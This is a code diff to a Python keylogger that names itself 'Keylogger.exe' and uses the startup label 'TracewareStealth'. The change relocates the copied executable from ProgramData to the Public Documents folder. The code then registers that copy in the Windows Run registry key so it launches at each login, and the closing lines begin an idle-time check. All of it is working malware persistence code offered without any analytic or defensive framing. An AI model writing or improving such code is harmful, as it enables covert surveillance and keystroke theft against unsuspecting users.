@@ -176,21 +176,21 @@ import winreg as reg
 
 # Define paths
 original_path = os.path.abspath(__file__)  # Path to the current executable
-backup_path = r"C:\ProgramData\Keylogger.exe"  # Path to where you want to copy it
+alternative_path = r"C:\Users\Public\Documents\Keylogger.exe"  # Alternative path for copying
 
-# Function to copy the executable to ProgramData
-def copy_executable_to_programdata():
+# Function to copy the executable to an alternative location
+def copy_executable_to_alternative():
     try:
-        shutil.copy(original_path, backup_path)
-        print("Executable copied to C:\\ProgramData.")
+        shutil.copy(original_path, alternative_path)
+        print("Executable copied to Public Documents folder.")
     except Exception as e:
-        print(f"Failed to copy executable to ProgramData: {e}")
+        print(f"Failed to copy executable to Public Documents folder: {e}")
 
 # Function to add the script to Windows startup
 def add_to_startup():
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
     value_name = "TracewareStealth"
-    command = f'"{backup_path}" --processStart Keylogger.exe'  # Command to run the executable from ProgramData
+    command = f'"{alternative_path}" --processStart Keylogger.exe'  # Command to run the executable from the alternative location
 
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
@@ -198,12 +198,11 @@ def add_to_startup():
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
-# Copy the executable to ProgramData
-copy_executable_to_programdata()
+# Copy the executable to the alternative location
+copy_executable_to_alternative()
 
 # Add to startup
 add_to_startup()
-
 # Function to check idle time
 def get_idle_duration():
     last_input_info = win32api.GetLastInputInfo()
